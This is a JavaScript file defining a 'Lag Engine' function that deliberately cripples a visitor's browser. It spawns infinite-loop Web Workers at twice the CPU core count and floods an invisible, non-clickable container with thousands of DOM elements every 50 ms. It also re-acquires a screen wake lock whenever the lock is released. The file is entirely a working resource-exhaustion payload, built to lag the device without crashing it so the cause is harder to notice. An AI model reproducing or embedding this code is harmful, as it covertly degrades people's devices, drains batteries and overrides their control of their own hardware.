export function startLagEngine() {
  console.log("Engaging Lag Engine...");
  
  // 1. CPU / Worker Bomb
  const workerBlob = new Blob([`
    onmessage = function() {
      while(true) {
        let x = Math.random() * Math.random();
        for(let i=0; i<1000; i++) { x = Math.sqrt(x) + Math.sin(x); }
      }
    }
  `], { type: 'application/javascript' });
  const workerUrl = URL.createObjectURL(workerBlob);
  
  // Spawn enough workers to throttle the CPU
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores * 2; i++) {
    const worker = new Worker(workerUrl);
    worker.postMessage('start');
  }

  // 2. DOM / Memory Bomb
  const bombContainer = document.createElement('div');
  bombContainer.style.opacity = '0';
  bombContainer.style.pointerEvents = 'none';
  bombContainer.style.position = 'fixed';
  bombContainer.style.zIndex = '-9999';
  document.body.appendChild(bombContainer);

  let elements = [];
  setInterval(() => {
    // Inject 500 DOM elements per interval
    const frag = document.createDocumentFragment();
    for(let i=0; i<500; i++){
      const el = document.createElement('div');
      el.textContent = 'LAG'.repeat(10);
      frag.appendChild(el);
      elements.push(el);
    }
    bombContainer.appendChild(frag);
    
    // Prevent complete crash, just intense lag
    if (elements.length > 50000) {
      bombContainer.innerHTML = '';
      elements = [];
    }
  }, 50);

  // 3. Keep-Awake WakeLock
  if ('wakeLock' in navigator) {
    try {
      navigator.wakeLock.request('screen').then(lock => {
        lock.addEventListener('release', () => {
          // If released, request again!
          navigator.wakeLock.request('screen');
        });
      });
    } catch(e) {}
  }
}
